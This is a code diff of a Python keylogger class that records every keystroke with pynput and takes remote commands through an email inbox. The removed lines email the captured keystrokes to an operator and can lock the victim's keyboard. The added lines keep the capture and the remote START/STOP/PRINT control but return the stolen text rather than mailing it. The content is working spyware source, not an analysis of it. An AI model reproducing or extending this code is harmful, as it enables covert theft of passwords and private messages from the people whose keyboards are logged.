@@ -5,18 +5,13 @@ import time
 from pynput.keyboard import Listener 
 
 class KeyloggerControl:
-    def __init__(self):
-        self.isLock = 0
-        self.isHook = 0
-        self.flag = 0
-        self.container = " "
-        self.msg = ""
-        self.emailFrom = ""
 
-    def Keylogger(self, key):
-        if self.flag == 4:
+    @staticmethod
+    def Keylogger(key):
+        global container
+        if not isHook:
             return False
-        if self.flag == 1:
+        if isHook:
             tmp = str(key)
             if tmp == 'Key.space':
                 tmp = ' '
@@ -24,64 +19,57 @@ class KeyloggerControl:
                 tmp = "'"
             else:
                 tmp = tmp.replace("'", "")
-            self.container += str(tmp)
+            container += str(tmp)
         return
 
-    def Print(self, emailTemplate):
-        response = {
+    @staticmethod
+    def Print():
+        return {
             "isSuccess": True,
-            "message": self.container
+            "message": container
         }
-        emailTemplate.SendNotification(emailFrom = emailTemplate.username , emailTo = self.emailFrom, subject = "[No-reply] Server Response", body = json.dumps(response))
-        self.container = " "
-        return
-    
-    def Listen(self):
-        with Listener(on_press = self.Keylogger) as listener:
+
+    @staticmethod
+    def Listen():
+        with Listener(on_press = KeyloggerControl.Keylogger) as listener:
             listener.join()  
         return
     
-    def Lock(self):
-        if self.isLock == 0:
-            for i in range(150):
-                keyboard.block_key(i)
-            self.isLock = 1
-        else:
-            for i in range(150):
-                keyboard.unblock_key(i)
-            self.isLock = 0
-        return
+    
+    @staticmethod
+    def LoadData(emailTemplate):
+        global action
 
-    def KeyloggerHandle(self, emailTemplate, emailFrom):
-        self.emailFrom = emailFrom
-        self.isLock = 0
-        self.isHook = 0
-        self.flag = 0
-        self.container = " "
-        self.msg = ""
-        threading.Thread(target = self.Listen).start() 
+        action = ''
 
-        while True:
-            time.sleep(5)
-            requestContent = emailTemplate.Receive()
-            if not requestContent:
-                continue
-            jsonContent = json.loads(requestContent)
-            body = jsonContent["Body"]
-            bodyJson = json.loads(body)
-            data = bodyJson["Data"]
-            if data == 'HOOK'  :
-                if self.isHook == 0:
-                    self.flag = 1
-                    self.isHook = 1
-                else:
-                    self.flag = 2
-                    self.isHook = 0
-            elif data == 'PRINT':
-                self.Print(emailTemplate)
-            elif "LOCK" == data:
-                self.Lock()
-            elif "QUIT" == data:
-                self.flag = 4
-                return    
-        return 
+        requestContent = emailTemplate.Receive()
+        if not requestContent:
+            return
+        jsonContent = json.loads(requestContent)
+        body = json.loads(jsonContent["Body"])
+        if("Data" in body):
+            data = body["Data"]
+            if("Action" in data):
+                action = data["Action"]
+
+    @staticmethod
+    def KeyloggerHandle(emailTemplate):
+        global isHook 
+        global container
+
+        isHook = True
+        container = " "
+
+        threading.Thread(target = KeyloggerControl.Listen).start()
+
+        while True:            
+            KeyloggerControl.LoadData(emailTemplate)
+            
+            if action == 'PRINT':
+                return KeyloggerControl.Print()
+            elif action == "START":
+                isHook = True
+            elif action == "STOP":
+                isHook = False
+
+
